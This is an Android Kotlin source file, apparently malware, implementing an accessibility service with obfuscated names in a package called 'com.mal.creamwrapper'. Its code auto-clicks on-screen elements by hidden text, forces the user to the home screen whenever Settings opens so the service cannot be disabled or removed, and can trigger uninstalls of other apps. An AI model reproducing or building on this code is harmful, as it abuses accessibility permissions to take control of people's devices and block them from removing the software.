package com.mal.creamwrapper

import android.R.attr.text
import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.net.Uri
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.content.ContextCompat.startActivity
import com.mal.creamwrapper.A11yConfig.abbssid

class MyABS : AccessibilityService() {
    override fun onServiceConnected() {
        super.onServiceConnected()
        A11yConfig.service = this
        applyConfig()

    }
    val SETTINGS_PKG = "com.android.settings"
    lateinit var pkg : String
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {

        when (abbssid) {
            0 -> Unit
            1 -> {
                val root = rootInActiveWindow ?: return
                val nodes = root.findAccessibilityNodeInfosByText(getString(R.string.djuefcww))
                nodes.firstOrNull()?.let {
                    it.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
                okabss(1)
            }
            2-> {
                if (event?.packageName == SETTINGS_PKG) {
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }
            }
            3-> {

            }

        }
    }
    fun okabss(okobssid: Int){

    }

    fun uninstallApp(packageName: String) {
        val intent = Intent(
            Intent.ACTION_DELETE,
            Uri.parse("package:$packageName")
        )
        startActivity(intent)
        abbssid = 1
    }




    override fun onInterrupt() {
    }



    fun applyConfig() {
        serviceInfo = serviceInfo?.apply {
            eventTypes = A11yConfig.eventTypes
            packageNames = A11yConfig.packageNames
            notificationTimeout = A11yConfig.notificationTimeout
            flags = A11yConfig.flags
        }
    }

    fun test(text: String) {

    }

    override fun onUnbind(intent: Intent?): Boolean {
        A11yConfig.service = null
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        A11yConfig.service = null
        super.onDestroy()
    }
}